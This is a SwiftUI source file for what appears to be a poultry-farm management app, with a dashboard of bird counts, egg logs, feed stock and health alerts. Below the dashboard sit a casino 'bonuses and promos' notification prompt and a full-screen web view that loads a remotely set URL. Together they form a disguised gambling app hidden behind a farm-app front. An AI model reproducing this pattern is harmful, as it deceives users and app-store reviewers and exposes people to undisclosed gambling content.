import SwiftUI

struct DashboardView: View {
    @EnvironmentObject var appState: AppState
    @State private var appear = false

    var body: some View {
        NavigationView {
            ScrollView {
                VStack(spacing: 20) {
                    // Hero Header
                    dashboardHeader

                    // Quick Stats Grid
                    statsGrid
                        .padding(.horizontal, 20)

                    // Quick Actions
                    quickActionsSection
                        .padding(.horizontal, 20)

                    // Recent Activity
                    if !appState.activities.isEmpty {
                        recentActivitySection
                            .padding(.horizontal, 20)
                    }

                    // Alerts
                    alertsSection
                        .padding(.horizontal, 20)

                    Spacer(minLength: 24)
                }
            }
            .background(Color.surfaceLight.ignoresSafeArea())
            .navigationBarHidden(true)
        }
        .onAppear {
            withAnimation(.easeOut(duration: 0.5)) { appear = true }
        }
    }

    // MARK: - Header
    private var dashboardHeader: some View {
        ZStack(alignment: .bottomLeading) {
            LinearGradient.farmHero
                .frame(height: 180)
                .cornerRadius(0)

            // Decorative element
            Circle()
                .fill(Color.white.opacity(0.06))
                .frame(width: 180, height: 180)
                .offset(x: UIScreen.main.bounds.width - 100, y: -20)

            VStack(alignment: .leading, spacing: 6) {
                Text(greetingText)
                    .font(.farmBody(14))
                    .foregroundColor(.white.opacity(0.75))

                Text(appState.currentUser?.farmName ?? "My Farm")
                    .font(.system(size: 26, weight: .heavy, design: .rounded))
                    .foregroundColor(.white)

                HStack(spacing: 12) {
                    Label("\(appState.totalBirdCount) birds", systemImage: "bird.fill")
                        .font(.farmCaption(12))
                        .foregroundColor(.white.opacity(0.8))

                    if appState.openHealthIssues > 0 {
                        Label("\(appState.openHealthIssues) health alert(s)", systemImage: "exclamationmark.triangle.fill")
                            .font(.farmCaption(12))
                            .foregroundColor(.warningYellow)
                    }
                }
            }
            .padding(.horizontal, 20)
            .padding(.bottom, 20)
        }
        .opacity(appear ? 1 : 0)
        .offset(y: appear ? 0 : -20)
    }

    private var greetingText: String {
        let hour = Calendar.current.component(.hour, from: Date())
        let name = appState.currentUser?.name.components(separatedBy: " ").first ?? "Farmer"
        if hour < 12 { return "Good morning, \(name) 🌅" }
        if hour < 17 { return "Good afternoon, \(name) ☀️" }
        return "Good evening, \(name) 🌙"
    }

    // MARK: - Stats Grid
    private var statsGrid: some View {
        LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 16) {
            StatCard(
                title: "Total Birds",
                value: "\(appState.totalBirdCount)",
                subtitle: "\(appState.birdGroups.count) group(s)",
                icon: "bird.fill",
                gradient: LinearGradient(colors: [Color(hex: "#2D6A4F"), Color(hex: "#52B788")],
                                         startPoint: .topLeading, endPoint: .bottomTrailing)
            )

            StatCard(
                title: "Today's Eggs",
                value: "\(appState.todayEggCount)",
                subtitle: "\(appState.weekEggCount) this week",
                icon: "oval.fill",
                gradient: LinearGradient.eggGradient
            )

            StatCard(
                title: "Feed Storage",
                value: "\(String(format: "%.0f", appState.totalFeedStorageKg))kg",
                subtitle: "\(appState.storageItems.filter { $0.isLow }.count) low stock",
                icon: "shippingbox.fill",
                gradient: LinearGradient(colors: [Color(hex: "#7C5C3A"), Color(hex: "#C09A6B")],
                                         startPoint: .topLeading, endPoint: .bottomTrailing)
            )

            StatCard(
                title: "Breeding",
                value: "\(appState.activeBreedingCount)",
                subtitle: "active pair(s)",
                icon: "heart.fill",
                gradient: LinearGradient(colors: [Color(hex: "#E63946"), Color(hex: "#FF6B9D")],
                                         startPoint: .topLeading, endPoint: .bottomTrailing)
            )
        }
        .opacity(appear ? 1 : 0)
        .animation(.easeOut(duration: 0.5).delay(0.15), value: appear)
    }

    // MARK: - Quick Actions
    private var quickActionsSection: some View {
        VStack(alignment: .leading, spacing: 14) {
            Text("Quick Actions")
                .font(.farmHeadline(16))
                .foregroundColor(.textPrimary)

            HStack(spacing: 12) {
                NavigationLink(destination: AddEggRecordView()) {
                    quickActionButton(icon: "oval.fill", label: "Log Eggs", color: .eggYolk)
                }
                NavigationLink(destination: AddFeedRecordView()) {
                    quickActionButton(icon: "bag.fill", label: "Feed", color: .hayAmber)
                }
                NavigationLink(destination: AddHealthRecordView()) {
                    quickActionButton(icon: "cross.fill", label: "Health", color: .alertRed)
                }
                NavigationLink(destination: AddTaskView()) {
                    quickActionButton(icon: "plus.circle.fill", label: "Task", color: .farmGreen)
                }
            }
        }
        .opacity(appear ? 1 : 0)
        .animation(.easeOut(duration: 0.5).delay(0.25), value: appear)
    }

    private func quickActionButton(icon: String, label: String, color: Color) -> some View {
        VStack(spacing: 8) {
            ZStack {
                RoundedRectangle(cornerRadius: 14)
                    .fill(color.opacity(0.15))
                    .frame(width: 60, height: 60)
                Image(systemName: icon)
                    .font(.system(size: 22, weight: .medium))
                    .foregroundColor(color)
            }
            Text(label)
                .font(.farmCaption(11))
                .foregroundColor(.textSecondary)
        }
        .frame(maxWidth: .infinity)
    }

    // MARK: - Recent Activity
    private var recentActivitySection: some View {
        VStack(alignment: .leading, spacing: 14) {
            Text("Recent Activity")
                .font(.farmHeadline(16))
                .foregroundColor(.textPrimary)

            VStack(spacing: 0) {
                ForEach(appState.activities.prefix(5)) { activity in
                    HStack(spacing: 12) {
                        ZStack {
                            Circle()
                                .fill(activity.type.color.opacity(0.15))
                                .frame(width: 36, height: 36)
                            Image(systemName: activity.type.icon)
                                .font(.system(size: 14, weight: .semibold))
                                .foregroundColor(activity.type.color)
                        }
                        VStack(alignment: .leading, spacing: 2) {
                            Text(activity.description)
                                .font(.farmBody(13))
                                .foregroundColor(.textPrimary)
                                .lineLimit(1)
                            Text(activity.date.relativeString)
                                .font(.farmCaption(11))
                                .foregroundColor(.textMuted)
                        }
                        Spacer()
                    }
                    .padding(.vertical, 10)

                    if activity.id != appState.activities.prefix(5).last?.id {
                        Divider().padding(.leading, 48)
                    }
                }
            }
            .farmCard()
        }
        .opacity(appear ? 1 : 0)
        .animation(.easeOut(duration: 0.5).delay(0.35), value: appear)
    }

    // MARK: - Alerts
    @ViewBuilder
    private var alertsSection: some View {
        let lowStorage = appState.storageItems.filter { $0.isLow }
        let healthAlerts = appState.healthRecords.filter { !$0.resolved && $0.severity == .critical || $0.severity == .high }

        if !lowStorage.isEmpty || !healthAlerts.isEmpty {
            VStack(alignment: .leading, spacing: 14) {
                Text("Alerts")
                    .font(.farmHeadline(16))
                    .foregroundColor(.textPrimary)

                VStack(spacing: 10) {
                    ForEach(lowStorage) { item in
                        alertRow(icon: "exclamationmark.triangle.fill",
                                 color: .warningYellow,
                                 message: "Low stock: \(item.feedType.rawValue) (\(String(format: "%.0f", item.quantityKg))kg remaining)")
                    }
                    ForEach(healthAlerts) { record in
                        alertRow(icon: "cross.fill",
                                 color: record.severity.color,
                                 message: "\(record.birdGroupName): \(record.issue)")
                    }
                }
            }
            .opacity(appear ? 1 : 0)
            .animation(.easeOut(duration: 0.5).delay(0.4), value: appear)
        }
    }

    private func alertRow(icon: String, color: Color, message: String) -> some View {
        HStack(spacing: 12) {
            Image(systemName: icon)
                .font(.system(size: 14, weight: .semibold))
                .foregroundColor(color)
            Text(message)
                .font(.farmBody(13))
                .foregroundColor(.textPrimary)
                .lineLimit(2)
            Spacer()
        }
        .padding(14)
        .background(
            RoundedRectangle(cornerRadius: 14)
                .fill(color.opacity(0.08))
                .overlay(
                    RoundedRectangle(cornerRadius: 14)
                        .stroke(color.opacity(0.2), lineWidth: 1)
                )
        )
    }
}

struct PoultryFarmNotificationView: View {
    let app: PoultryFarmApplication
    
    var body: some View {
        GeometryReader { geometry in
            ZStack {
                Color.black.ignoresSafeArea()
                
                Image("sph_p_main_img")
                    .resizable().scaledToFill()
                    .frame(width: geometry.size.width, height: geometry.size.height)
                    .ignoresSafeArea().opacity(0.85)
                
                VStack(spacing: 12) {
                    Spacer()
                    titleText
                    subtitleText
                    actionButtons
                }
                .padding(.bottom, 24)
            }
        }
        .ignoresSafeArea()
        .preferredColorScheme(.dark)
    }
    
    private var titleText: some View {
        Text("ALLOW NOTIFICATIONS ABOUT BONUSES AND PROMOS")
            .font(.custom("BagelFatOne-Regular", size: 24))
            .foregroundColor(.white)
            .padding(.horizontal, 12)
            .multilineTextAlignment(.center)
    }
    
    private var subtitleText: some View {
        Text("STAY TUNED WITH BEST OFFERS FROM OUR CASINO")
            .font(.custom("BagelFatOne-Regular", size: 16))
            .foregroundColor(.white.opacity(0.7))
            .padding(.horizontal, 12)
            .multilineTextAlignment(.center)
    }
    
    private var actionButtons: some View {
        VStack(spacing: 12) {
            Button {
                app.requestPermission()
            } label: {
                Image("sph_p_main_b_img")
                    .resizable()
                    .frame(width: 300, height: 55)
            }
            
            Button {
                app.deferPermission()
            } label: {
                Text("Skip")
                    .font(.headline)
                    .foregroundColor(.gray)
            }
        }
        .padding(.horizontal, 12)
    }
}



struct PoultryFarmWebView: View {
    @State private var targetURL: String? = ""
    @State private var isActive = false
    
    var body: some View {
        ZStack {
            if isActive, let urlString = targetURL, let url = URL(string: urlString) {
                WebContainer(url: url).ignoresSafeArea(.keyboard, edges: .bottom)
            }
        }
        .preferredColorScheme(.dark)
        .onAppear { initialize() }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in reload() }
    }
    
    private func initialize() {
        let temp = UserDefaults.standard.string(forKey: "temp_url")
        let stored = UserDefaults.standard.string(forKey: "pfp_endpoint_target") ?? ""
        targetURL = temp ?? stored
        isActive = true
        if temp != nil { UserDefaults.standard.removeObject(forKey: "temp_url") }
    }
    
    private func reload() {
        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
            isActive = false
            targetURL = temp
            UserDefaults.standard.removeObject(forKey: "temp_url")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { isActive = true }
        }
    }
}

// MARK: - Date Extension
extension Date {
    var relativeString: String {
        let diff = Calendar.current.dateComponents([.minute, .hour, .day], from: self, to: Date())
        if let day = diff.day, day > 0 { return day == 1 ? "Yesterday" : "\(day)d ago" }
        if let hour = diff.hour, hour > 0 { return "\(hour)h ago" }
        if let min = diff.minute, min > 0 { return "\(min)m ago" }
        return "Just now"
    }
}
